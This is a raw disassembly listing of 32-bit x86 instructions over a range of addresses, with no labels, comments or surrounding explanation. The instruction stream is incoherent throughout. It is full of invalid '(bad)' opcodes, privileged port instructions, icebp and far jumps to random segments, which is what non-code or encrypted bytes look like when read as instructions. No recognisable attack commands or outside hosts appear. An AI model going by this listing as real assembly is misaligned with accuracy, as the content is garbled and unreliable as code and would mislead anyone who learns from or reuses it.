  4099ec:	mov    esp,0xac6a9abf
  4099f1:	mov    al,0xb8
  4099f3:	jnp    0x40997e
  4099f5:	shl    DWORD PTR [eax+0x46],0x3d
  4099f9:	add    al,0xd7
  4099fb:	stc    
  4099fc:	xor    eax,0x1f3534dc
  409a01:	in     eax,dx
  409a02:	mov    al,0xe
  409a04:	or     BYTE PTR [ebx-0x6a],ch
  409a07:	jmp    0x4099fc
  409a09:	jp     0x409a75
  409a0b:	push   eax
  409a0c:	fld    TBYTE PTR [ebp+0x7b211e75]
  409a12:	and    al,0x6b
  409a14:	push   edx
  409a15:	cs xchg ebx,eax
  409a17:	push   ds
  409a18:	push   edi
  409a19:	out    0xa9,eax
  409a1b:	pop    edx
  409a1c:	fadd   DWORD PTR [eax]
  409a1e:	fsub   DWORD PTR [edx]
  409a20:	xlat   BYTE PTR ds:[ebx]
  409a21:	mov    WORD PTR [eax+0x6d],?
  409a24:	aam    0x83
  409a26:	in     al,dx
  409a27:	in     eax,dx
  409a28:	aam    0x5d
  409a2a:	fwait
  409a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a2c:	fbld   TBYTE PTR [ebp-0x348e30fe]
  409a32:	shl    edx,1
  409a34:	enter  0x21f2,0xbc
  409a38:	jnp    0x409a37
  409a3a:	je     0x409a64
  409a3c:	sub    al,0x57
  409a3e:	inc    esi
  409a3f:	js     0x409a90
  409a41:	shl    edx,1
  409a43:	lods   al,BYTE PTR ds:[esi]
  409a44:	pop    ebp
  409a45:	mov    dl,0xc4
  409a47:	sub    BYTE PTR [edi-0x3],0xb4
  409a4b:	cmp    DWORD PTR [ebx+0x6e1ad0b4],eax
  409a51:	enter  0xd211,0x15
  409a55:	in     al,dx
  409a56:	adc    al,0xe9
  409a58:	stos   BYTE PTR es:[edi],al
  409a59:	iret   
  409a5a:	pop    ds
  409a5b:	gs push ss
  409a5d:	out    0x27,eax
  409a5f:	push   edi
  409a60:	xor    esp,DWORD PTR [eax]
  409a62:	jo     0x409a31
  409a64:	and    al,0x8a
  409a66:	mov    dh,cl
  409a68:	push   ecx
  409a69:	aad    0x88
  409a6b:	pop    ds
  409a6c:	loop   0x409ae1
  409a6e:	aas    
  409a6f:	fcmovnbe st,st(6)
  409a71:	lods   al,BYTE PTR ds:[esi]
  409a72:	cmp    eax,0x2846f192
  409a77:	lods   eax,DWORD PTR ds:[esi]
  409a78:	sbb    al,0x6e
  409a7a:	dec    eax
  409a7b:	and    DWORD PTR [edx+0x1a15d257],eax
  409a81:	push   0xffffff85
  409a83:	pop    edx
  409a84:	loope  0x409a4c
  409a86:	jb     0x409a81
  409a88:	loopne 0x409a66
  409a8a:	push   0x72
  409a8c:	or     ecx,edx
  409a8e:	xor    bl,bl
  409a90:	lods   al,BYTE PTR ds:[esi]
  409a91:	xor    ch,0x4f
  409a94:	xor    DWORD PTR [ebp+0x42643866],esp
  409a9a:	test   BYTE PTR [ebx+0x7543401c],al
  409aa0:	pop    ebx
  409aa1:	dec    ebx
  409aa2:	or     DWORD PTR [esi+0xe227e3e],ebp
  409aa8:	in     eax,dx
  409aa9:	cmp    al,0x96
  409aab:	dec    ecx
  409aac:	in     al,dx
  409aad:	aad    0xb5
  409aaf:	mov    dh,0xbc
  409ab1:	daa    
  409ab2:	retf   0xce
  409ab5:	sahf   
  409ab6:	in     eax,0x4f
  409ab8:	test   dl,dl
  409aba:	daa    
  409abb:	pop    ds
  409abc:	leave  
  409abd:	in     al,dx
  409abe:	inc    ecx
  409abf:	pushf  
  409ac0:	cs add eax,0x80c6f55
  409ac6:	ret    
  409ac7:	out    0xc2,eax
  409ac9:	and    eax,0x1b8eef15
  409ace:	data16 cmp dl,al
  409ad1:	xor    ah,ah
  409ad3:	mov    bh,BYTE PTR [edi]
  409ad5:	dec    ebx
  409ad6:	shl    DWORD PTR [ebp+0x1b],0xf3
  409ada:	icebp  
  409adb:	fstp   TBYTE PTR [edx-0x6305a871]
  409ae1:	fld    TBYTE PTR [eax+0x201b08ce]
  409ae7:	icebp  
  409ae8:	mov    al,0x3f
  409aea:	sbb    ebx,ecx
  409aec:	test   DWORD PTR [esi-0x9babfa],ebp
  409af2:	retf   
  409af3:	mov    edi,0x5bf57e5d
  409af8:	idiv   DWORD PTR [eax]
  409afa:	nop
  409afb:	dec    ecx
  409afc:	jmp    0x409b5d
  409afe:	pop    es
  409aff:	dec    edi
  409b00:	cs pop edi
  409b02:	outs   dx,BYTE PTR ds:[esi]
  409b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b04:	shl    DWORD PTR [esi+0x543a2437],0xa9
  409b0b:	dec    ebp
  409b0c:	jge    0x409b0d
  409b0e:	xor    al,0x3a
  409b10:	loop   0x409b59
  409b12:	pop    ebx
  409b13:	rol    DWORD PTR [ebx],1
  409b15:	sub    ebx,DWORD PTR [edx-0x1f835a85]
  409b1b:	pusha  
  409b1c:	cmp    ah,BYTE PTR [ebx+0x94de23a]
  409b22:	pop    ss
  409b23:	jo     0x409af5
  409b25:	icebp  
  409b26:	and    BYTE PTR [ebp+0x52],0xad
  409b2a:	sbb    BYTE PTR [ebx-0x29],bh
  409b2d:	arpl   bp,bx
  409b2f:	cmc    
  409b30:	fsub   st(3),st
  409b32:	adc    DWORD PTR [edx+ebp*1],ebp
  409b35:	lea    ecx,[edi-0x66]
  409b38:	jmp    0x409aef
  409b3a:	std    
  409b3b:	clc    
  409b3c:	pusha  
  409b3d:	jmp    0x2118eef7
  409b42:	(bad)  
  409b43:	(bad)  
  409b44:	in     al,dx
  409b45:	sbb    eax,0xd504d6d0
  409b4a:	dec    esp
  409b4b:	inc    esi
  409b4c:	lods   eax,DWORD PTR ds:[esi]
  409b4d:	stos   DWORD PTR es:[edi],eax
  409b4e:	popf   
  409b4f:	out    dx,eax
  409b50:	outs   dx,BYTE PTR ds:[esi]
  409b51:	outs   dx,DWORD PTR ds:[esi]
  409b52:	in     eax,dx
  409b53:	pop    es
  409b54:	out    dx,eax
  409b55:	ret    0x1bad
  409b58:	adc    ch,BYTE PTR [esi]
  409b5a:	pop    ebx
  409b5b:	push   ss
  409b5c:	ror    DWORD PTR [ecx-0x23],0x7d
  409b60:	mov    bl,0x83
  409b62:	call   0xeb20635e
  409b67:	outs   dx,DWORD PTR ds:[esi]
  409b68:	icebp  
  409b69:	inc    ecx
  409b6a:	mov    bh,0x1b
  409b6c:	mov    WORD PTR [edx-0x5d],ds
  409b6f:	jbe    0x409b62
  409b71:	xchg   ecx,eax
  409b72:	(bad)  
  409b73:	push   0xd050ef20
  409b78:	jne    0x409b61
  409b7a:	shl    ecx,1
  409b7c:	pop    ss
  409b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b7e:	dec    dx
  409b80:	cmp    edx,DWORD PTR [ebx-0x2772c0b3]
  409b86:	mov    esi,ebp
  409b88:	gs inc esi
  409b8a:	jecxz  0x409b6d
  409b8c:	ret    0x1617
  409b8f:	cmp    eax,0x7edc84c0
  409b94:	cmp    si,0x4835
  409b99:	mov    dh,0xaa
  409b9b:	jge    0x409bfb
  409b9d:	iret   
  409b9e:	sbb    al,0x7f
  409ba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ba1:	out    dx,eax
  409ba2:	jb     0x409bdb
  409ba4:	push   0x81746caf
  409ba9:	out    0x46,eax
  409bab:	cmp    DWORD PTR [ebp-0x77],ecx
  409bae:	pop    ecx
  409baf:	inc    ebx
  409bb0:	push   esi
  409bb1:	xchg   edx,eax
  409bb2:	xchg   edi,eax
  409bb3:	icebp  
  409bb4:	mov    esp,0x4ef5f1ee
  409bb9:	repz or al,0x37
  409bbc:	and    eax,0x73a237cf
  409bc1:	jecxz  0x409c3c
  409bc3:	and    eax,0x81293be2
  409bc8:	xchg   ebp,eax
  409bc9:	mov    ds:0xbc6880e8,eax
  409bce:	lock push es
  409bd0:	add    BYTE PTR [eax-0xe],cl
  409bd3:	stos   BYTE PTR es:[edi],al
  409bd4:	lock (bad) 
  409bd6:	jp     0x409c36
  409bd8:	cmp    ch,dh
  409bda:	int    0xe6
  409bdc:	cs mov esp,0x3853a621
  409be2:	mov    db3,edx
  409be5:	int3   
  409be6:	cmovle ecx,DWORD PTR ds:0xe57b9c27
  409bed:	mov    eax,0x5c9e2744
  409bf2:	inc    ebp
  409bf3:	add    bh,ch
  409bf5:	fsubr  DWORD PTR [eax+0x4e]
  409bf8:	jae    0x409c54
  409bfa:	adc    eax,0x32b8f5ca
  409bff:	mov    ds:0xb671882f,al
  409c04:	add    BYTE PTR [ecx-0x642898ab],dh
  409c0a:	cmp    bl,BYTE PTR [ebp+0x1b]
  409c0d:	nop
  409c0e:	and    edi,DWORD PTR [edi+0x76]
  409c11:	inc    edi
  409c12:	pop    esp
  409c13:	aaa    
  409c14:	xchg   ebx,eax
  409c15:	call   0xe149a4c5
  409c1a:	xor    eax,0xd63bc9b8
  409c1f:	loop   0x409c59
  409c21:	ins    BYTE PTR es:[edi],dx
  409c22:	js     0x409c5d
  409c24:	ja     0x409c9e
  409c26:	outs   dx,DWORD PTR ds:[esi]
  409c27:	or     eax,0xcee75ada
  409c2c:	rcr    DWORD PTR [edx+0x6ee0e445],0xed
  409c33:	(bad)  
  409c34:	push   esp
  409c35:	xchg   esp,eax
  409c36:	loop   0x409ca1
  409c38:	fdiv   st(5),st
  409c3a:	ficomp DWORD PTR [ecx]
  409c3c:	cmp    ah,BYTE PTR [di]
  409c3f:	in     al,0x2c
  409c41:	test   eax,0xd6ac0f
  409c46:	pop    edi
  409c47:	pop    ss
  409c48:	ret    
  409c49:	test   al,0x3c
  409c4b:	outs   dx,DWORD PTR ds:[esi]
  409c4c:	cmp    eax,0x984dad60
  409c51:	cmp    al,0x57
  409c53:	jbe    0x409c93
  409c55:	out    0x85,eax
  409c57:	inc    edi
  409c58:	outs   dx,BYTE PTR ds:[esi]
  409c59:	add    ebp,DWORD PTR [ebx*1+0x49c92e42]
  409c60:	dec    edi
  409c61:	jecxz  0x409bef
  409c63:	mov    dl,0x7e
  409c65:	fistp  WORD PTR [eax-0x4c]
  409c68:	gs cmp eax,0x6cf2a3bf
  409c6e:	and    al,0x42
  409c70:	adc    bl,al
  409c72:	jmp    0xa2f9:0xda30c16a
  409c79:	and    eax,0xa589f3e8
  409c7e:	test   DWORD PTR [ebx+0x6],esp
  409c81:	rcl    BYTE PTR ds:0xb645754c,1
  409c87:	aam    0x87
  409c89:	mov    WORD PTR [ebx],gs
  409c8b:	xor    ecx,eax
  409c8d:	pop    esp
  409c8e:	sti    
  409c8f:	mul    DWORD PTR [ebx]
  409c91:	addr16 pop ecx
  409c93:	(bad)  
  409c94:	repnz clc 
  409c96:	rcl    BYTE PTR [ebp+ebx*1-0x10],1
  409c9a:	mov    ds:0x62916bdc,eax
  409c9f:	pop    edx
  409ca0:	xchg   esp,esp
  409ca2:	mov    ah,BYTE PTR [ecx+0x5c0ed223]
  409ca8:	lahf   
  409ca9:	push   esp
  409caa:	cmp    ch,BYTE PTR [edx+0x39]
  409cad:	pop    edi
  409cae:	test   DWORD PTR [ebp+edx*4-0x5565f778],ebx
  409cb5:	std    
  409cb6:	cmp    ecx,esi
  409cb8:	scas   eax,DWORD PTR es:[edi]
  409cb9:	stos   DWORD PTR es:[edi],eax
  409cba:	mov    ds,WORD PTR ds:0xc410cf36
  409cc0:	cmp    ebx,DWORD PTR ds:[ebp-0x23]
  409cc4:	mov    ds:0xd8269461,al
  409cc9:	inc    ebp
  409cca:	out    dx,al
  409ccb:	sbb    bh,BYTE PTR [eax+0x3c]
  409cce:	push   0xffffffb3
  409cd0:	vinsertf32x8 zmm3{k6},zmm6,YMMWORD PTR [esp+ecx*1],0x2
  409cd8:	icebp  
  409cd9:	and    al,0xb2
  409cdb:	call   0x5027:0x8fa2906d
  409ce2:	sub    BYTE PTR [edx-0x390dfbcc],al
  409ce8:	or     eax,esp
  409cea:	jne    0x409d65
  409cec:	xor    esi,esi
  409cee:	loop   0x409cfa
  409cf0:	add    ch,ch
  409cf2:	sub    eax,0x80767229
  409cf7:	out    dx,eax
  409cf8:	ja     0x409d70
  409cfa:	mov    esi,0xebaf832c
  409cff:	xchg   edi,eax
  409d00:	mov    al,0x15
  409d02:	xchg   ah,bl
  409d04:	sbb    al,0x22
  409d06:	cmp    eax,0x6133fd45
  409d0b:	jmp    0x18a0:0xc6393f24
  409d12:	add    BYTE PTR [esi],ah
  409d14:	jb     0x409d62
  409d16:	mov    al,ds:0xaf97af3
  409d1b:	and    BYTE PTR [ecx],0x33
  409d1e:	and    BYTE PTR [eax-0x78],bh
  409d21:	loopne 0x409cfe
  409d23:	push   ebp
  409d24:	sub    DWORD PTR cs:[eax+0x3a502cb],edx
  409d2b:	adc    eax,0x32046c75
  409d30:	ror    DWORD PTR [edx-0x481c0d5e],cl
  409d36:	enter  0xadd9,0xd1
  409d3a:	push   ds
  409d3b:	jmp    0x409d9c
  409d3d:	cmp    BYTE PTR [edx-0x9d9dbdf],ah
  409d43:	data16 loopne 0x409d06
  409d46:	xchg   BYTE PTR [eax+0xe614ed7],bh
  409d4c:	sub    ebx,0xffffffec
  409d4f:	or     ebp,DWORD PTR [esi+0x4497d477]
  409d55:	xchg   esi,eax
  409d56:	adc    ch,ah
  409d58:	mov    ah,0xde
  409d5a:	sub    eax,0x2dcae4c1
  409d5f:	(bad)  
  409d60:	pop    esp
  409d61:	ror    BYTE PTR [ecx+0x1],cl
  409d64:	add    eax,0x216aad4b
  409d6a:	cmp    dl,ch
  409d6c:	adc    BYTE PTR [ebp-0x31],bh
  409d6f:	jge    0x409d92
  409d71:	xchg   edi,eax
  409d72:	xchg   edx,eax
  409d73:	enter  0xb266,0xd6
  409d77:	push   ebp
  409d78:	cld    
  409d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d7a:	sbb    edx,DWORD PTR [ebx]
  409d7c:	mov    cs,WORD PTR [edx-0x2]
  409d7f:	fistp  QWORD PTR [eax+0x50]
  409d82:	inc    ebp
  409d83:	jne    0x409d81
  409d85:	jle    0x409dfd
  409d87:	jl     0x409df2
  409d89:	mov    esi,0xba5a425d
  409d8e:	in     eax,0x10
  409d90:	mov    eax,0xc1f06c2e
  409d95:	xor    edi,DWORD PTR [ebp+0x4b4f4425]
  409d9b:	out    dx,al
  409d9c:	fadd   DWORD PTR [esi-0x240bd0a8]
  409da2:	std    
  409da3:	pop    es
  409da4:	push   esi
  409da6:	fwait
  409da7:	icebp  
  409da8:	dec    esp
  409da9:	aas    
  409daa:	ja     0x409d81
  409dac:	jg     0x409d35
  409dae:	sbb    bl,BYTE PTR [ecx-0x280c5d4]
  409db4:	dec    edi
  409db5:	add    ch,BYTE PTR [ecx]
  409db7:	sub    dh,BYTE PTR [edx-0x5738447]
  409dbd:	xchg   ebx,eax
  409dbe:	imul   DWORD PTR [ecx+0x7f]
  409dc1:	push   eax
  409dc2:	ror    DWORD PTR [ecx],0x54
  409dc5:	pop    es
  409dc6:	inc    ecx
  409dc7:	push   cs
  409dc8:	aad    0x19
  409dca:	sub    edx,DWORD PTR [ecx]
  409dcc:	and    bh,BYTE PTR [edx+0x2d0e90dd]
  409dd2:	dec    eax
  409dd3:	outs   dx,BYTE PTR ds:[esi]
  409dd4:	cmp    ebx,DWORD PTR [eax]
  409dd6:	aas    
  409dd7:	icebp  
  409dd8:	pop    ds
  409dd9:	popf   
  409dda:	inc    eax
  409ddb:	sbb    eax,DWORD PTR [edx+0x29]
  409dde:	jg     0x409e52
  409de0:	mov    ebp,0xec77d818
  409de5:	xchg   BYTE PTR [ebp+edx*1+0x4f],bl
  409de9:	mov    ah,0x17
  409deb:	mov    eax,0x70437acb
  409df0:	and    BYTE PTR [esi+0xfc7e751],0xe5
  409df7:	popf   
  409df8:	or     al,0x99
  409dfa:	jg     0x409df7
  409dfc:	sbb    al,0xc4
  409dfe:	shr    eax,1
  409e00:	mov    edi,0xa81228b
  409e05:	icebp  
  409e06:	inc    ebp
  409e07:	js     0x409dbe
  409e09:	test   al,0x2f
  409e0b:	stos   BYTE PTR es:[edi],al
  409e0c:	jb     0x409da4
  409e0e:	das    
  409e0f:	(bad)  
  409e10:	jmp    0x4dbc5f24
  409e15:	shl    ecx,0xd0
  409e18:	fisttp WORD PTR es:[edi-0x561796f5]
  409e1f:	dec    ebx
  409e20:	xor    al,0x78
  409e22:	test   DWORD PTR [ecx+0x2a328834],esp
  409e28:	mov    ecx,0xef2e4648
  409e2d:	(bad)  
  409e2e:	mov    ds:0xb823b39a,eax
  409e33:	call   0xbc074da2
  409e38:	xor    ecx,eax
  409e3a:	retf   
  409e3b:	(bad)  
  409e3c:	repz mov bl,0x96
  409e3f:	lahf   
  409e40:	jg     0x409e84
  409e42:	pop    edi
  409e43:	fld    DWORD PTR [eax]
  409e45:	ins    BYTE PTR es:[edi],dx
  409e46:	push   ebx
  409e47:	nop
  409e48:	cld    
  409e49:	sar    BYTE PTR [ebx+0x3cda2587],1
  409e4f:	ins    DWORD PTR es:[edi],dx
  409e50:	jg     0x409de6
  409e52:	fsubr  QWORD PTR [edx-0x29]
  409e55:	lods   al,BYTE PTR ds:[esi]
  409e56:	shl    BYTE PTR [ebx+0x9f4b4f],cl
  409e5c:	in     al,dx
  409e5d:	add    esp,DWORD PTR ds:0xb1a4d331
  409e63:	cmp    edx,0xffffffb2
  409e66:	mov    ebx,0x2aa3a7f
  409e6b:	(bad)  
  409e6c:	in     al,0xb3
  409e6e:	xor    al,0x7e
  409e70:	push   0x54
  409e72:	jb     0x409e90
  409e74:	inc    eax
  409e75:	inc    ecx
  409e76:	xor    cl,BYTE PTR [esi+0x44]
  409e79:	mov    al,dl
  409e7b:	and    dh,ch
  409e7d:	xor    eax,0xe11c467c
  409e82:	arpl   WORD PTR [eax],dx
  409e84:	mov    eax,ds:0x92d2eb39
  409e89:	and    BYTE PTR [esi],0x17
  409e8c:	mov    ebx,0xd7fefe74
  409e91:	pop    ecx
  409e92:	cmp    esi,edx
  409e94:	ret    
  409e95:	jo     0x409ed4
  409e97:	imul   ebx,ebx,0x2c
  409e9a:	and    ah,BYTE PTR [edi]
  409e9c:	aas    
  409e9d:	cmp    eax,0x76761f53
  409ea2:	mov    WORD PTR [edx+0x3f49619d],?
  409ea8:	pusha  
  409ea9:	jne    0x409ec6
  409eab:	fisubr WORD PTR [ecx]
  409ead:	sahf   
  409eae:	cmp    edx,DWORD PTR gs:[edi+0x2b5e3284]
  409eb5:	xchg   BYTE PTR [edi],al
  409eb7:	(bad)  
  409eb9:	or     eax,DWORD PTR [esp+eax*1+0x3f3fd860]
  409ec0:	(bad)  
  409ec1:	mov    ebp,0x6f09a5b1
  409ec6:	xchg   edi,eax
  409ec7:	nop
  409ec8:	mov    bh,0xac
  409eca:	xor    al,0x7a
  409ecc:	sbb    ebp,DWORD PTR [ecx+eiz*1+0x6ab58191]
  409ed3:	retf   0xdd33
  409ed6:	pop    edi
  409ed7:	popa   
  409ed8:	dec    ebp
  409ed9:	push   es
  409eda:	jbe    0x409f2c
  409edc:	aaa    
  409edd:	or     DWORD PTR ds:0x9587db58,esp
  409ee3:	or     BYTE PTR ds:0x40c7a3ba,bl
  409ee9:	jo     0x409e8b
  409eeb:	aam    0xb2
  409eed:	cli    
  409eee:	lea    eax,[ebx-0x1773d4c7]
  409ef4:	out    0xab,al
  409ef6:	shl    DWORD PTR [ebp+0x11],1
  409ef9:	jmp    0x409e8e
  409efb:	push   esi
  409efc:	out    dx,al
  409efd:	mov    al,0xff
  409eff:	cwde   
  409f00:	jmp    0xdab:0x4b12d345
  409f07:	cdq    
  409f08:	pop    ecx
  409f09:	cmp    al,0xcb
  409f0b:	je     0x409f47
  409f0d:	sbb    BYTE PTR [ebx],ch
  409f0f:	adc    dl,BYTE PTR [esi+0x29]
  409f12:	jge    0x409f17
  409f14:	data16 out dx,al
  409f16:	dec    edx
  409f17:	aas    
  409f18:	dec    esp
  409f19:	ret    0xb6f9
  409f1c:	mov    cl,BYTE PTR ds:0x65f5ae83
  409f22:	stc    
  409f23:	dec    esi
  409f24:	call   0xc6ff:0xb2fd711e
  409f2b:	je     0x409f8a
  409f2d:	popa   
  409f2e:	test   DWORD PTR [esi-0x55ee299],eax
  409f34:	add    al,0x6f
  409f36:	pushf  
  409f37:	test   DWORD PTR [ebp-0x41],edi
  409f3a:	sub    eax,edi
  409f3c:	add    DWORD PTR [ebp+eiz*4+0x0],ecx
  409f40:	sbb    esi,DWORD PTR [esi-0x53]
  409f43:	aad    0x7b
  409f45:	jmp    0x521c9160
  409f4a:	ins    DWORD PTR es:[edi],dx
  409f4b:	arpl   WORD PTR [ecx],dx
  409f4d:	call   0x7611:0x53e7fa5e
  409f54:	ds mov al,0x59
  409f57:	fstp   st(0)
  409f59:	cmp    bl,dh
  409f5b:	in     eax,0xc3
  409f5d:	loop   0x409eec
  409f5f:	and    WORD PTR [ebx-0x44],sp
  409f63:	push   cs
  409f64:	mul    BYTE PTR [eax+0x6e]
  409f67:	mov    bl,0xf6
  409f69:	adc    eax,0x58707dc7
  409f6e:	stos   DWORD PTR es:[edi],eax
  409f6f:	leave  
  409f70:	mov    eax,0x43743837
  409f75:	lahf   
  409f76:	scas   eax,DWORD PTR es:[edi]
  409f77:	fsub   st(7),st
  409f79:	jns    0x409f6c
  409f7b:	push   ebp
  409f7c:	(bad)  
  409f7d:	retf   0x140
  409f80:	(bad)  
  409f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f82:	dec    ecx
  409f83:	pop    esi
  409f84:	sub    eax,edx
  409f86:	jl     0x409f4d
  409f88:	scas   eax,DWORD PTR es:[edi]
  409f89:	mov    dl,0x57
  409f8b:	mov    esp,0x7662c35
  409f90:	fucom  st(4)
  409f92:	fidiv  WORD PTR [ebp-0x5e]
  409f95:	popf   
  409f96:	mov    WORD PTR [ebp-0x1731e8ff],fs
  409f9c:	mov    BYTE PTR [ebp-0x747446f],dh
  409fa2:	daa    
  409fa3:	push   ebp
  409fa4:	push   es
  409fa5:	sbb    al,al
  409fa7:	pushw  cs
  409fa9:	push   ds
  409faa:	cmp    BYTE PTR [ebp-0x12],bh
  409fad:	sub    al,ah
  409faf:	int    0xfd
  409fb1:	dec    ebx
  409fb2:	imul   ecx,esi,0x4d
  409fb5:	pushf  
  409fb6:	mov    bl,0xb3
  409fb9:	lock jb 0x409ffb
  409fbc:	push   0xebb02b13
  409fc1:	xchg   edi,eax
  409fc2:	push   eax
  409fc3:	cmp    dl,BYTE PTR [ecx-0x1a]
  409fc6:	add    bl,ah
  409fc8:	gs mov ch,0x20
  409fcb:	dec    eax
  409fcc:	neg    DWORD PTR [esi-0x5d261488]
  409fd2:	mov    ecx,0xbf2813a2
  409fd7:	inc    esi
  409fd8:	scas   eax,DWORD PTR es:[edi]
  409fd9:	mov    bh,0x94
  409fdb:	dec    esi
  409fdc:	setae  BYTE PTR [ecx-0x4]
  409fe0:	mov    WORD PTR [ebx],ds
  409fe2:	repz int3 
  409fe4:	enter  0x8c43,0x79
  409fe8:	inc    edi
  409fe9:	test   BYTE PTR [esi],0x1a
  409fec:	ja     0x40a04b
  409fee:	jge    0x40a010
  409ff0:	lods   eax,DWORD PTR ds:[esi]
  409ff1:	ss push esi
  409ff3:	ds ins BYTE PTR es:[edi],dx
  409ff5:	(bad)  
  409ff7:	jno    0x40a02e
  409ff9:	mov    dh,0x1e
  409ffb:	sti    
  409ffc:	jo     0x40a01c
  409ffe:	fsub   DWORD PTR [eax+0x5c]
  40a001:	sti    
  40a002:	xor    edx,DWORD PTR ds:0xa6810718
  40a008:	mov    esi,esp
  40a00a:	push   ecx
  40a00b:	dec    ebp
  40a00c:	ret    
  40a00d:	mov    cl,cl
  40a00f:	in     al,0xe9
  40a011:	pcmpgtw mm0,QWORD PTR [esi-0x7ce65e9f]
  40a018:	pop    ebp
  40a019:	cmc    
  40a01a:	sahf   
  40a01b:	loope  0x40a09c
  40a01d:	scas   eax,DWORD PTR es:[edi]
  40a01e:	pop    edi
  40a01f:	mov    ?,WORD PTR [ecx]
  40a021:	cli    
  40a022:	mov    ecx,0xd0f04598
  40a027:	repnz repz push 0x54
  40a02b:	int3   
  40a02c:	scas   eax,DWORD PTR es:[edi]
  40a02d:	xor    al,0xfa
  40a02f:	leave  
  40a030:	add    BYTE PTR cs:[ebp+0x30],dl
  40a034:	pop    edi
  40a035:	ror    esp,cl
  40a037:	and    ecx,ecx
  40a039:	ss cli 
  40a03b:	mov    ebx,0x33b9ca18
  40a040:	repnz xchg esp,eax
  40a042:	inc    edi
  40a043:	push   esi
  40a044:	add    esi,DWORD PTR gs:[edx+0x1]
  40a048:	std    
  40a049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a04a:	popa   
  40a04b:	jo     0x40a051
  40a04d:	pop    ebp
  40a04e:	pop    ecx
  40a04f:	in     eax,dx
  40a050:	and    DWORD PTR [edx-0x18],0x3ec6ee7
  40a057:	loope  0x40a02b
  40a059:	pop    esp
  40a05a:	adc    al,0xab
  40a05c:	retf   
  40a05d:	(bad)  
  40a05f:	int3   
  40a060:	lds    ecx,FWORD PTR [ebx-0x396c523e]
  40a066:	xchg   edi,eax
  40a067:	mov    eax,ds:0xc906a596
  40a06c:	ret    
  40a06d:	out    0xed,al
  40a06f:	aaa    
  40a070:	push   esp
  40a071:	cmp    edi,ecx
  40a073:	cs xchg ecx,eax
  40a075:	jmp    0xdf13:0x5e19d337
  40a07c:	sbb    BYTE PTR [edi-0x15],0x4a
  40a080:	add    al,0x8e
  40a082:	scas   al,BYTE PTR es:[edi]
  40a083:	pop    edx
  40a084:	(bad)  
  40a085:	sbb    esp,eax
  40a087:	outs   dx,BYTE PTR ds:[esi]
  40a088:	adc    edx,edi
  40a08a:	(bad)  
  40a08c:	dec    ebx
  40a08d:	sub    ch,dl
  40a08f:	dec    esi
  40a090:	xor    BYTE PTR [esi],ch
  40a092:	sti    
  40a093:	jbe    0x40a0db
  40a095:	jmp    0x40a072
  40a097:	retf   0x3362
  40a09a:	cmp    eax,0xea4994fd
  40a09f:	scas   eax,DWORD PTR es:[edi]
  40a0a0:	pop    eax
  40a0a1:	mov    ecx,0xeec1271d
  40a0a6:	mov    ds:0xb5025ebd,al
  40a0ab:	mov    ecx,0x3b346055
  40a0b0:	push   ds
  40a0b1:	hlt    
  40a0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0b3:	aam    0x21
  40a0b5:	xchg   ecx,eax
  40a0b6:	or     BYTE PTR [esi+0x58d144cd],cl
  40a0bc:	xchg   ebp,eax
  40a0bd:	sub    bl,bl
  40a0bf:	xchg   ecx,eax
  40a0c0:	inc    esp
  40a0c1:	xor    DWORD PTR [ebx+0x68],esp
  40a0c4:	cmp    cl,BYTE PTR [ebx-0x68]
  40a0c7:	push   cs
  40a0c8:	sbb    eax,0x2bfbd4c8
  40a0cd:	ins    BYTE PTR es:[edi],dx
  40a0ce:	push   ebx
  40a0cf:	test   DWORD PTR [ecx-0x77136b9c],ebx
  40a0d5:	scas   eax,DWORD PTR es:[edi]
  40a0d6:	(bad)  
  40a0d7:	test   DWORD PTR [ecx+0x7b],esi
  40a0da:	xchg   edx,eax
  40a0db:	mov    al,ds:0x8136ab16
  40a0e0:	or     BYTE PTR [ebp-0x20317d78],cl
  40a0e6:	fwait
  40a0e7:	loop   0x40a164
  40a0e9:	mov    ch,0xd6
  40a0eb:	mov    ebx,0xfcb0777d
  40a0f0:	mov    edi,DWORD PTR [edx]
  40a0f2:	ret    0x5d55
  40a0f5:	mov    ds:0xb86dcf88,eax
  40a0fa:	jmp    0x9893:0x1e8e0d9d
  40a101:	mov    edi,0x5edab0f2
  40a106:	dec    esp
  40a107:	inc    ecx
  40a108:	ror    bl,1
  40a10a:	dec    edi
  40a10b:	adc    edi,DWORD PTR [ecx-0x431573c6]
  40a111:	mov    esp,0xd96f1207
  40a116:	xor    eax,esi
  40a118:	adc    ecx,eax
  40a11a:	mov    ds:0x8caf1a37,al
  40a11f:	sbb    eax,0x7aa9e592
  40a124:	mov    dl,0x18
  40a126:	pop    edx
  40a127:	call   0xfc34:0x8dd34974
  40a12e:	xchg   ecx,eax
  40a12f:	mov    esp,0x864fb627
  40a134:	jg     0x40a110
  40a136:	xlat   BYTE PTR ds:[ebx]
  40a137:	(bad)  
  40a138:	std    
  40a139:	addr16 enter 0x1857,0x3e
  40a13e:	xor    BYTE PTR [eax],ch
  40a140:	int3   
  40a141:	mov    dl,0x91
  40a143:	mov    bl,0xe4
  40a145:	mov    ch,0xbf
  40a147:	inc    esp
  40a148:	je     0x40a176
  40a14a:	fadd   DWORD PTR [edx]
  40a14c:	mov    bh,0xdc
  40a14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a14f:	jb     0x40a125
  40a151:	call   0x152e:0xcaad5ee8
  40a158:	pop    edi
  40a159:	or     BYTE PTR [edi],cl
  40a15b:	adc    al,0x95
  40a15d:	mov    eax,0x6211653e
  40a162:	sahf   
  40a163:	xor    DWORD PTR [ebp-0x2ba9efec],edi
  40a169:	push   edi
  40a16a:	mov    ah,0x74
  40a16c:	lds    ebx,FWORD PTR [edi-0x1e2d830f]
  40a172:	mov    esi,0x42782c33
  40a177:	fs jle 0x40a10d
  40a17a:	in     al,0x5b
  40a17c:	scas   eax,DWORD PTR es:[edi]
  40a17d:	xor    BYTE PTR [eax],bl
  40a17f:	inc    esi
  40a180:	retf   
  40a181:	scas   al,BYTE PTR es:[edi]
  40a182:	mov    dl,0xc8
  40a184:	and    eax,0xeb81b9b3
  40a189:	mov    eax,0x4b3930ab
  40a18e:	sub    ebx,DWORD PTR [ecx]
